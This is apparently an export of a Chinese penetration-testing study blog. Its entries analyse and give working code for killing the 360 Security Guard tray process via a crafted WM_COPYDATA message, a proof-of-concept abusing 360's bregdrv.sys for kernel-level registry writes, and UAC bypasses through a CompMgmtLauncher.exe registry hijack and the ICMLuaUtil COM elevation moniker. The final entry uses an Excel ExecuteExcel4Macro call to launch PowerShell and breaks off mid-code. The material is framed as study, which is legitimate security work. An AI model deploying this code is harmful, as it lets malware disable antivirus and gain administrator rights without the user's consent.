src="https://user-images.githubusercontent.com/16742566/80297627-6a46a100-87b7-11ea-963d-52a59eb95b0a.png" alt="image"></a></p><h4 id="计划列表"><a href="#计划列表" class="headerlink" title="计划列表"></a>计划列表</h4><ol><li>支持多进程、支持64位、更多模块（kener32、user32…） 更多api支持、支持脚本自动拦截并设置参数及返回值</li></ol><h4 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h4><ol><li><a href="https://www.qt.io/blog/qt-5.14.2-released">qt5.14.2</a></li><li><a href="https://github.com/simdjson/simdjson">simdjson</a></li></ol><p>…</p><h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4><ul><li><a href="https://github.com/stonedreamforest/Navy_public/releases/tag/v20200429">下载：v20200621</a></li><li><a href="https://github.com/stonedreamforest/Navy_public/blob/master/CHANGELOG.md">更新日志</a></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.5-an-quan-ruan-jian-fen-xi-si-wei-dao-xiang-zhong/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.5-an-quan-ruan-jian-fen-xi-si-wei-dao-xiang-zhong/</url>
      
        <content type="html"><![CDATA[<h2 id="某数字卫士溢出漏洞分析（一）"><a href="#某数字卫士溢出漏洞分析（一）" class="headerlink" title="某数字卫士溢出漏洞分析（一）"></a>某数字卫士溢出漏洞分析（一）</h2><p>通分析某RAT payload运行后可以关闭某数字安全卫士，根据rat payload逆向分析发现该rat只是运行了以下代码：</p><pre class="line-numbers language-none"><code class="language-none">HMODULE h360 =GetModuleHandle(TEXT("safemon.dll"));int i = 0;for (i = 0; i&lt;0x30000; i++){if (memcmp((BYTE *)(h360+i), "\x83\xEC\x10\x56\x8D\x44\x24\x04\x50",9)==0){         break;}}if (i==0x30000){return;}FARPROC funcGet360HWND = (FARPROC)(h360+i);HWND hWnd = (HWND)funcGet360HWND();COPYDATASTRUCT cpdata;cpdata.dwData = 0x4d47534d;cpdata.cbData = 0x1000;cpdata.lpData = msgbuf;  //长度0x1000字节的随即数据，其中不能有连续\x00\x00SendMessage(hWnd, WM_COPYDATA, NULL,(LPARAM)&amp;cpdata);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们自己用上面代码运行之后，360安全卫士的进程（360tray.exe）就自动退出了。注意：这个程序必须是带窗口的程序，而不能使控制台程序，因为控制台程序是不加载safemon.dll的。</p><h3 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a><strong>攻击原理</strong></h3><p>上面如此简单的代码就能导致关闭360，我们来看一下这段代码到底做了什么？首先获得safemon.dll的模块地址，每个有图形界面都会加载这个dll。然后从这个模块里找一处特征代码，经分析发现找的是以下代码：</p><pre class="line-numbers language-none"><code class="language-none">67366570   83EC 10         sub     esp, 1067366573   56              push    esi67366574   8D4424 04       lea     eax, dword ptr [esp+4]67366578   50              push    eax67366579   6A 00           push   06736657B   8D4C24 10       lea     ecx, dword ptr [esp+10]6736657F   51              push    ecx67366580   68 40653667     push    6736654067366585   6A 00           push    067366587   6A 00           push    067366589   C74424 20 E48D4&gt;mov     dwordptr [esp+20], 67418DE4                   ; ASCII "Q360SafeMonClass"67366591   C74424 24 00000&gt;mov     dwordptr [esp+24], 067366599   C74424 28 00000&gt;mov     dwordptr [esp+28], 0673665A1   FF15 10D34067   call    dword ptr [&lt;&amp;KERNEL32.GetCurrentProcess&gt;]       ; kernel32.GetCurrentProcess673665A7   50              push    eax673665A8   FF15 58D14067   call    dword ptr[&lt;&amp;KERNEL32.CreateRemoteThread&gt;]     ; kernel32.CreateRemoteThread673665AE   8BF0            mov     esi,eax673665B0   85F6            test    esi, esi673665B2   74 10           je      short 673665C4673665B4   6A FF           push    -1673665B6   56              push    esi673665B7   FF15 24D14067   call    dword ptr [&lt;&amp;KERNEL32.WaitForSingleObject&gt;]     ; kernel32.WaitForSingleObject673665BD   56              push    esi673665BE   FF15 20D34067   call    dword ptr[&lt;&amp;KERNEL32.CloseHandle&gt;]            ; kernel32.CloseHandle673665C4   8B4424 10       mov     eax, dword ptr [esp+10]673665C8   5E              pop     esi673665C9   83C4 10         add     esp, 10673665CC   C3              retn<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其作用就是找到Q360SafeMonClass的窗口句柄。找到这段代码后就会执行这段代码来获取该窗口句柄。为什么不直接用FindWindow来查找呢？据分析应该是360做了一些防护，直接找怕找不到。</p><p>找到这个窗口后会给他发送WM_COPYDATA消息，附带的消息COPYDATASTRUCT结构的dwData是0x4d47534d，数据长度是0×1000，内容是随机数据。</p><p>我自己写了个程序模拟上述功能后，运行成功结束了360tray的进程，证明原理是没有错的。</p><h2 id="某数字卫士溢出漏洞分析（二）"><a href="#某数字卫士溢出漏洞分析（二）" class="headerlink" title="某数字卫士溢出漏洞分析（二）"></a>某数字卫士溢出漏洞分析（二）</h2><h3 id="漏洞调试"><a href="#漏洞调试" class="headerlink" title="漏洞调试"></a><strong>漏洞调试</strong></h3><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1650241554092/97c7459335d646c8a7dd35728ca60c26.png" alt="image.png"></p><p>究竟是什么原因导致360tray如此简单就被关闭呢，我决定调试一下360看，启动OD准备附加360tray进程，发现无法附加，360做了保护。要想调试360首先要把保护去掉。</p><p>用XueTr看360的内核Hook点，并尝试恢复：</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1650241554092/d9c989d6026d4fc398131913650858d6.png" alt="image.png"></p><p>恢复之后尝试OD附加仍然失败，再刷新hook点已经被恢复了，这是当然的，360也要保护自身嘛。于是windbg开双机调试，在hook点下写断点，这样当360驱动恢复这里的时候，我们把他nop掉。</p><pre class="line-numbers language-none"><code class="language-none">kd&gt; eb f747ed78 c3kd&gt; u f747ed78Hookport+0xcd78:f747ed78 c3              retf747ed79 ff558b          call    dword ptr [ebp-75h]f747ed7c ec              in      al,dxf747ed7d 51              push   ecxf747ed7e 51              push    ecxf747ed7f 8d45fc          lea     eax,[ebp-4]f747ed82 50              push    eaxf747ed83 ff1594ff47f7    call   dword ptr [Hookport+0xdf94 (f747ff94)]kd&gt; g<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="某数字卫士溢出漏洞分析（三）"><a href="#某数字卫士溢出漏洞分析（三）" class="headerlink" title="某数字卫士溢出漏洞分析（三）"></a>某数字卫士溢出漏洞分析（三）</h2><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1650241554092/b8181d9292b54b0fbe46e2acf7a04907.png" alt="image.png"></p><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a><strong>漏洞原理</strong></h3><p>经过调试发现，导致360出错退出的地方在360safemonpro.tpi这个模块里inline编译的vsnwprintf，从这里调用：</p><p><a href="http://www.j0s1ph.com/wp-content/uploads/2014/04/1397446938227.jpg"><img src="http://www.j0s1ph.com/wp-content/uploads/2014/04/1397446938227.jpg" alt="1397446938227" title="点击查看大图"></a></p><p>IDA里面的代码：</p><pre class="line-numbers language-none"><code class="language-none">int sub_10012240(wchar_t *Format, ...){  int v1; // eax@1  wchar_t Dest; // [sp+0h] [bp-1000h]@1  __int16 v4; // [sp+FFEh] [bp-2h]@4  va_list va; // [sp+1008h] [bp+8h]@1  va_start(va, Format);  v1 = vsnwprintf(&amp;Dest, 0x7FFu, Format, va);  if ( v1 &lt; 0 || (unsigned int)v1 &gt; 0x7FF || v1 == 2047 )    v4 = 0;  sub_10013670();  return sub_10012BC0(&amp;Dest);}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对应的源代码是：<br>output.c<br>/<em>textlen now contains length in multibyte chars <em>/<br>} else{<br>if(text.wz== NULL) /</em> NULLpassed, use special string <em>/<br>text.wz = __wnullstring;<br>bufferiswide= 1;<br>pwch= text.wz;<br>while(i– &amp;&amp; <em>pwch)  //这里出错了<br>++pwch;<br>textlen= (int)(pwch- text.wz);       /</em> in wchar_ts</em>/<br>/<em>textlen now contains length in wide chars <em>/<br>}<br>看起来360的用法是没有错的，这里不存在溢出之类的漏洞，我分析认为这是微软挖的一个坑，360不幸掉进去了，对WM_COPYDATA的数据处理不当回导致访问未映射的内存。<br>以下是来自网上的WM_COPYDATA数据传递的原理：<br>跨线程的WM_COPYDATA没有使用共享内存，反而复制了两次数据<br>发送者SendMessage-&amp;#x3e;xxxSendMessageTimeout-&amp;#x3e;xxxInterSendMsgEx(UserAllocPoolWithQuota分配内核内存，将用户数据复制到内核空间)-&amp;#x3e;SetWakeBit唤醒接受者-&amp;#x3e;SetWakeBit等待应答<br>接受者xxxReceiveMessage-&amp;#x3e;XXXSENDMESSAGETOCLIENT(宏)-&amp;#x3e;ScSendMessageSMS(也是宏)-&amp;#x3e;SfnCOPYDATA(sender side)-&amp;#x3e;CaptureCallbackData(把数据从内核空间复制到用户空间)-&amp;#x3e;KeUserModeCallback(转到用户模式)-&amp;#x3e;SfnCOPYDATA(receiver side)-&amp;#x3e;窗口过程-&amp;#x3e;回到内核模式，应答发送者………..<br>?<br>所以传递的数据并不是一块新分配的heap，而0×1000为单位长度映射的内存空间，是一块没头没尾的空间，一旦使用一些字符串操作函数直接访问这块空间，很容易造成越界访问到没映射的内存里。<br>??为了证实这个理论，我们可以自己写一个WM_COPYDATA的是以消息处理函数，模拟漏洞的产生过程：????<br>BOOL CrecvDlg::OnCopyData(CWnd</em> pWnd, COPYDATASTRUCT</em> pCopyDataStruct)<br>{<br>wchar_t buf[0x2000]={0};<br>_snwprintf(buf, 0x2000, L”url=%s”, pCopyDataStruct-&amp;#x3e;lpData);<br>return CDialog::OnCopyData(pWnd, pCopyDataStruct);<br>}<br>这段代码看上去是没什么问题的，直接把传进来的lpData当做字符串来处理。我们再写一个发送函数：<br>HWND hWnd=FindWindowA(“#32770″,”recv”);<br>if (hWnd)<br>{<br>int len=0x1000; //这一定要是0x1000的整数倍<br>char</em>buf=new char[len];<br>memset(buf, 0x41, len);<br>COPYDATASTRUCTcpdata;<br>cpdata.dwData = 0x4d47534d;<br>cpdata.cbData = len;<br>cpdata.lpData = buf;<br>SendMessage(hWnd, WM_COPYDATA,NULL, (LPARAM)&amp;cpdata);<br>delete[] buf;<br>}</p><h2 id="某数字卫士被绕过漏洞分析（四）"><a href="#某数字卫士被绕过漏洞分析（四）" class="headerlink" title="某数字卫士被绕过漏洞分析（四）"></a>某数字卫士被绕过漏洞分析（四）</h2><p>Description:</p><p>Qihoo 360 Security Guard is very famous in China.</p><p>Some vulnerabilities have been reported in Qihoo 360 Security Guard, which can be exploited by malicious, local users to gain escalated privileges.</p><p>An error in the kernel-mode driver (bregdrv.sys) when handling input passed through the user-mode dynamic link library (bregdll.dll) can be exploited to</p><p>read/write/modification registry in kernel mode.</p><p>An attacker can exploit this issue to read/write/modification registry with kernel-level privileges. Successful exploits will result in the complete</p><p>compromise of affected computers.</p><p>Details:</p><p>The kernel-mode driver (bregdrv.sys) use CmXxx series functions to read/write/modification registry with kernel-level privileges, bregdll.dll wrappers</p><p>implementation, the bregdll.dll improperly validating input passed from user mode to the kernel. All users can obtain handle of unprotected device</p><p>bregdrv.sys to read/write/modification registry with kernel-level privileges.</p><p>译文：</p><pre class="line-numbers language-none"><code class="language-none">说明：奇虎360安全卫士在中国非常有名。奇虎 360 安全卫士中报告了一些漏洞，恶意的本地用户可以利用这些漏洞获得升级权限。在处理通过用户模式动态链接库 (bregdll.dll) 传递的输入时，内核模式驱动程序 (bregdrv.sys) 中的错误可被利用在内核模式下读/写/修改注册表。攻击者可以利用此问题以内核级权限读取/写入/修改注册表，成功利用将导致完整受影响的计算机的妥协。详情： 详情：内核模式驱动程序 (bregdrv.sys) 使用 CmXxx 系列函数以内核级权限读取/写入/修改注册表，bregdll.dll 包装器实现，bregdll.dll 不正确地验证从用户模式传递到内核的输入。所有用户都可以获得未受保护设备的句柄bregdrv.sys 以内核级权限读取/写入/修改注册表。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">#include &lt;windows.h&gt;typedef BOOL (WINAPI *INIT_REG_ENGINE)();typedef LONG (WINAPI *BREG_DELETE_KEY)(HKEY hKey, LPCSTR lpSubKey);typedef LONG (WINAPI *BREG_OPEN_KEY)(HKEY hKey, LPCSTR lpSubKey, PHKEY phkResult);typedef LONG (WINAPI *BREG_CLOSE_KEY)(HKEY hKey);typedef LONG (WINAPI *REG_SET_VALUE_EX)(HKEY hKey, LPCSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE* lpData, DWORD cbData);BREG_DELETE_KEY BRegDeleteKey = NULL;BREG_OPEN_KEY BRegOpenKey = NULL;BREG_CLOSE_KEY BRegCloseKey = NULL;REG_SET_VALUE_EX BRegSetValueEx = NULL;#define AppPath   "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\360safe.exe"#define TestDeleteKey  HKEY_LOCAL_MACHINE#define TestDeleteRegPath "Software\\360Safe\\Update"#define TestSetKey  HKEY_LOCAL_MACHINE#define TestSetPath  "Software\\360Safe"BOOL InitBRegDll(){ LONG lResult; HKEY hKey; CHAR cPath[MAX_PATH + 32] = { 0 }; DWORD dwPathLen = MAX_PATH; lResult = RegOpenKeyA(HKEY_LOCAL_MACHINE, AppPath, &amp;hKey); if (FAILED(lResult))  return FALSE; DWORD dwType = REG_SZ; lResult = RegQueryValueExA(hKey, "Path", NULL, &amp;dwType, (LPBYTE)cPath, &amp;dwPathLen); RegCloseKey(hKey); if (FAILED(lResult))  return FALSE; strcat(cPath, "\\deepscan\\BREGDLL.dll&lt;file://\\deepscan\\BREGDLL.dll&gt;"); HMODULE modBReg = LoadLibraryA(cPath); if (!modBReg)  return FALSE; INIT_REG_ENGINE InitRegEngine = (INIT_REG_ENGINE)GetProcAddress(modBReg, "InitRegEngine"); BRegDeleteKey = (BREG_DELETE_KEY)GetProcAddress(modBReg, "BRegDeleteKey"); BRegOpenKey = (BREG_OPEN_KEY)GetProcAddress(modBReg, "BRegOpenKey"); BRegCloseKey = (BREG_CLOSE_KEY)GetProcAddress(modBReg, "BRegCloseKey"); BRegSetValueEx = (REG_SET_VALUE_EX)GetProcAddress(modBReg, "BRegSetValueEx"); if (!InitRegEngine || !BRegDeleteKey || !BRegOpenKey || !BRegCloseKey || !BRegSetValueEx) {  FreeLibrary(modBReg);  return FALSE; } if (!InitRegEngine()) {  FreeLibrary(modBReg);  return FALSE; } return TRUE;}LONG TestSetRegKey(){ HKEY hKey; LONG lResult; lResult = BRegOpenKey(TestSetKey, TestSetPath, &amp;hKey); if (FAILED(lResult))  return lResult; DWORD dwType = REG_SZ; static char szData[] = "TEST VALUE"; lResult = BRegSetValueEx(hKey, TestSetPath, NULL, dwType, (const BYTE *)&amp;szData, (DWORD)sizeof(szData)); BRegCloseKey(hKey); return lResult;}int main(int argc, char *argv[]){ if (!InitBRegDll()) {  MessageBoxA(NULL, "Initialization BReg error！", "error", MB_ICONSTOP);  return 1; } if (FAILED(BRegDeleteKey(TestDeleteKey, TestDeleteRegPath))) {  MessageBoxA(NULL, "DeleteKey error！", "error", MB_ICONSTOP);  return 2; } if (FAILED(TestSetRegKey())) {  MessageBoxA(NULL, "SetRegKey error！", "error", MB_ICONSTOP);  return 3; } MessageBoxA(NULL, "Broke System Security Check，Gain Escalated Privileges，Successful exploit！", "Successful", MB_OK); return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.31-bypass-uac-ti-quan-yuan-li-er/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.31-bypass-uac-ti-quan-yuan-li-er/</url>
      
        <content type="html"><![CDATA[<p>在CompMgmtLauncher.exe启动的过程中，有一个关键的操作就是它会先读取注册表HKCU\Software\Classes\mscfile\shell\open\command的数据。打开系统注册表编辑器regedit.exe，查看相应路径下的注册表，发现该注册表路径确实不存在。所以，如果自己构造该注册路径，写入启动程序的路径，这样，CompMgmtLauncher.exe便会启动该程序。为了验证这个猜想，自己手动添加该注册表路径，并设置默认的数据为C:\Windows\System32\cmd.exe，然后使用Procmon.exe进行监控并运行CompMgmtLauncher.exe，成功弹出cmd.exe命令行窗口，而且提示管理员权</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1656379868015/01a539cb84fe490ea6ee8d0bad6bc6fc.png" alt="image.png"></p><p>查看Procmon.exe的监控数据，CompMgmtLauncher.exe确实直接读取HKCU\Software\Classes\mscfile\shell\open\command(Default)注册表路径中的数据并启动，如图6-3所示</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1656379868015/f2114dbd83fa4bb28bafb7a932cae796.png" alt="image.png"></p><p>// 修改注册表</p><pre class="line-numbers language-none"><code class="language-none">BOOL SetReg(char *lpszExePath){HKEY hKey = NULL;// 创建项::RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Classes\\mscfile\\Shell\\Open\\Command", 0, NULL, 0, KEY_WOW64_64KEY | KEY_ALL_ACCESS, NULL, &amp;hKey, NULL);if (NULL == hKey){ShowError("RegCreateKeyEx");return FALSE;}// 设置键值::RegSetValueEx(hKey, NULL, 0, REG_SZ, (BYTE *)lpszExePath, (1 + ::lstrlen(lpszExePath)));// 关闭注册表::RegCloseKey(hKey);return TRUE;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>测试<br>直接运行上述程序，向注册表HKCU\Software\Classes\mscfile\shell\open\command(Default)中写入cmd.exe的路径，启动cmd.exe进程。cmd.exe成功启动，窗口标题显示管理员字样，如图6-4所示。</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1656379868015/77bd823912fd4f2898a6e3222c4b83ee.png" alt="image.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.31-bypass-uac-ti-quan-yuan-li-san/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.31-bypass-uac-ti-quan-yuan-li-san/</url>
      
        <content type="html"><![CDATA[<h2 id="基于COM组件接口Bypass-UAC"><a href="#基于COM组件接口Bypass-UAC" class="headerlink" title="基于COM组件接口Bypass UAC"></a>基于COM组件接口Bypass UAC</h2><p>COM提升名称（COM Elevation Moniker）技术允许运行在用户帐户控制（UAC）下的应用程序用提升权限的方法来激活COM类，以此提升COM接口权限。其中，ICMLuaUtil接口中提供了ShellExec方法来执行命令，创建指定进程。所以，本文介绍的基于ICMLuaUtil接口的Bypass UAC的实现原理是利用COM提升名称（COM Elevation Moniker）来对ICMLuaUtil接口提权，提权后通过调用ShellExec方法来创建指定进程，实现Bypass UAC操作。</p><p>使用权限提升COM类的程序必须调通过用CoCreateInstanceAsAdmin函数来创建COM类，CoCreateInstanceAsAdmin函数的代码可以在MSDN网页（ <a href="https://msdn.microsoft.com/zh-cn/library/windows/desktop/ms679687.aspx">https://msdn.microsoft.com/zh-cn/library/windows/desktop/ms679687.aspx</a> ）上找到，下面给出的是CoCreateInstanceAsAdmin函数的改进代码，增加了初始化COM环境的代码。</p><p>那么，COM提升名称具体的实现代码如下所示。</p><pre class="line-numbers language-none"><code class="language-none">HRESULT CoCreateInstanceAsAdmin(HWND hWnd, REFCLSID rclsid, REFIID riid, PVOID *ppVoid){BIND_OPTS3 bo;WCHAR wszCLSID[MAX_PATH] = { 0 };WCHAR wszMonikerName[MAX_PATH] = { 0 };HRESULT hr = 0;// 初始化COM环境::CoInitialize(NULL);// 构造字符串::StringFromGUID2(rclsid, wszCLSID, (sizeof(wszCLSID) / sizeof(wszCLSID[0])));hr = ::StringCchPrintfW(wszMonikerName, (sizeof(wszMonikerName) / sizeof(wszMonikerName[0])), L"Elevation:Administrator!new:%s", wszCLSID);if (FAILED(hr)){return hr;}// 设置BIND_OPTS3::RtlZeroMemory(&amp;bo, sizeof(bo));bo.cbStruct = sizeof(bo);bo.hwnd = hWnd;bo.dwClassContext = CLSCTX_LOCAL_SERVER;// 创建名称对象并获取COM对象hr = ::CoGetObject(wszMonikerName, &amp;bo, riid, ppVoid);return hr;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行上述代码，即可创建并激活提升权限的COM类。ICMLuaUtil接口通过上述方法创建后，直接调用ShellExec方法创建指定进程，完成Bypass UAC的操作。</p><p>那么，基于ICMLuaUtil接口Bypass UAC的具体实现代码如下所示。</p><pre class="line-numbers language-none"><code class="language-none">BOOL CMLuaUtilBypassUAC(LPWSTR lpwszExecutable){HRESULT hr = 0;CLSID clsidICMLuaUtil = { 0 };IID iidICMLuaUtil = { 0 };ICMLuaUtil *CMLuaUtil = NULL;BOOL bRet = FALSE;do {::CLSIDFromString(CLSID_CMSTPLUA, &amp;clsidICMLuaUtil);::IIDFromString(IID_ICMLuaUtil, &amp;iidICMLuaUtil);// 提权hr = CoCreateInstanceAsAdmin(NULL, clsidICMLuaUtil, iidICMLuaUtil, (PVOID*)(&amp;CMLuaUtil));if (FAILED(hr)){break;}// 启动程序hr = CMLuaUtil-&gt;lpVtbl-&gt;ShellExec(CMLuaUtil, lpwszExecutable, NULL, NULL, 0, SW_SHOW);if (FAILED(hr)){break;}bRet = TRUE;}while(FALSE);// 释放if (CMLuaUtil) {CMLuaUtil-&gt;lpVtbl-&gt;Release(CMLuaUtil);}return bRet;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.31-bypass-uac-ti-quan-yuan-li-yi/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.31-bypass-uac-ti-quan-yuan-li-yi/</url>
      
        <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>CreateProcessAsUser</p><p><a href="https://blog.csdn.net/xiaoyafang123/article/details/110087387">https://blog.csdn.net/xiaoyafang123/article/details/110087387</a></p><p>UAC（User Account Control）是微软在 Windows Vista 以后版本引入的一种安全机制，通过 UAC，应用程序和任务可始终在非管理员帐户的安全上下文中运行，除非管理员特别授予管理员级别的系统访问权限。UAC 可以阻止未经授权的应用程序自动进行安装，并防止无意中更改系统设置。</p><p>UAC需要授权的动作包括：配置Windows Update；增加或删除用户账户；改变用户的账户类型；改变UAC设置；安装ActiveX；安装或移除程序；安装设备驱动程序；设置家长控制；将文件移动或复制到Program Files或Windows目录；查看其他用户文件夹等。</p><p>在触发 UAC 时，系统会创建一个consent.exe进程，该进程通过白名单程序和用户选择来判断是否创建管理员权限进程。请求进程将要请求的进程cmdline和进程路径通过LPC接口传递给appinfo的RAiLuanchAdminProcess函数，该函数首先验证路径是否在白名单中，并将结果传递给consent.exe进程，该进程验证被请求的进程签名以及发起者的权限是否符合要求，然后决定是否弹出UAC框让用户进行确认。这个UAC框会创建新的安全桌面，屏蔽之前的界面。同时这个UAC框进程是SYSTEM权限进程，其他普通进程也无法和其进行通信交互。用户确认之后，会调用CreateProcessAsUser函数以管理员权限启动请求的进程。</p><p>所以，病毒木马想要实现更多权限操作，那么就不得不绕过UAC弹窗，在没有通知用户情况下, 静默地将程序普通权限提升为管理员权限，从而程序可以实现一些需要权限的操作。目前实现Bypass UAC的方法主要有两种方法，一种是利用白名单提权机制，另一种是利用COM组件接口技术。接下来，分别介绍这两种Bypass UAC的实现方法。</p><h2 id="基于白名单程序Bypass-UAC"><a href="#基于白名单程序Bypass-UAC" class="headerlink" title="基于白名单程序Bypass UAC"></a>基于白名单程序Bypass UAC</h2><p>有些系统程序是直接获取管理员权限，而不会触发UAC弹框，这类程序称为白名单程序。例如，slui.exe、wusa.exe、taskmgr.exe、msra.exe、eudcedit.exe、eventvwr.exe、CompMgmtLauncher.exe等等。可以通过对这些白名单程序进行DLL劫持、注入或是修改注册表执行命令的方式启动目标程序，实现Bypass UAC提权操作。</p><p>接下来，选取白名单程序CompMgmtLauncher.exe计算机管理程序进行详细分析，利用它实现Bypass UAC提权。下述的分析过程是在64位Windows 10操作系统上完成的，使用到的关键工具软件是进程监控器Procmon.exe。</p><p>实现过程<br>首先，直接到System32目录下运行CompMgmtLauncher.exe程序，并没有出现UAC弹窗，直接显示计算机管理的窗口界面。其中，使用进程监控器Procmon.exe来监控CompMgmtLauncher.exe进程的所有操作行为，主要是监控注册表和文件的操作。通过分析Procmon.exe的监控数据发现，CompMgmtLauncher.exe进程会先查询注册表HKCU\Software\Classes\mscfile\shell\open\command中数据，发现该路径不存在后，继续查询注册表HKCR\mscfile\shell\open\command(Default)中的数据并读取，该注册表路径中存储着mmc.exe进程的路径信息，如图6-1所示。然后，CompMgmtLauncher.exe会根据读取到的路径启动程序，显示计算机管理的窗口界面。</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1656379616007/0dc2acee9e9b4c8db74f3853f458de13.png" alt="image.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.30-bypass-zhu-dong-fang-yu-gan-huo-er/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/bi-ji-1.30-bypass-zhu-dong-fang-yu-gan-huo-er/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-none"><code class="language-none">#include "stdafx.h"#include &lt;windows.h&gt;#include &lt;iostream&gt;#include &lt;oaidl.h&gt;using namespace std;int _tmain(int argc, _TCHAR* argv[]){HRESULT hRet = E_FAIL;CLSID CLSID_excel;IDispatch *pXlApp;DISPID dispidNamed = DISPID_PROPERTYPUT;DISPID dispID;DISPPARAMS dispParams = { NULL, NULL, 0, 0 }; // do {CoInitialize(NULL);hRet = CLSIDFromProgID(L"Excel.Application", &amp;CLSID_excel);if (FAILED(hRet)){break;}hRet = CoCreateInstance(CLSID_excel, NULL, CLSCTX_LOCAL_SERVER, IID_IDispatch, (void **)&amp;pXlApp);if (FAILED(hRet)){break;}// 根据名字获取方法IDOLECHAR* szFuncName = L"ExecuteExcel4Macro";hRet = pXlApp-&gt;GetIDsOfNames(IID_NULL, &amp;szFuncName, 1, LOCALE_SYSTEM_DEFAULT, &amp;dispID);if (FAILED(hRet)){break;}dispParams.cArgs = 1;dispParams.cNamedArgs = 0;dispParams.rgdispidNamedArgs = NULL;dispParams.rgvarg = new VARIANTARG;dispParams.rgvarg-&gt;vt = VT_BSTR;dispParams.rgvarg-&gt;bstrVal = SysAllocString(L"call(\"kernel32\", \"WinExec\", \"JFJ\", \"explorer.exe /root,C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe\", 5)");hRet = pXlApp-&gt;Invoke(dispID, IID_NULL, LOCALE_SYSTEM_DEFAULT, DISPATCH_METHOD, &amp;dispParams, NULL, NULL, NULL);if 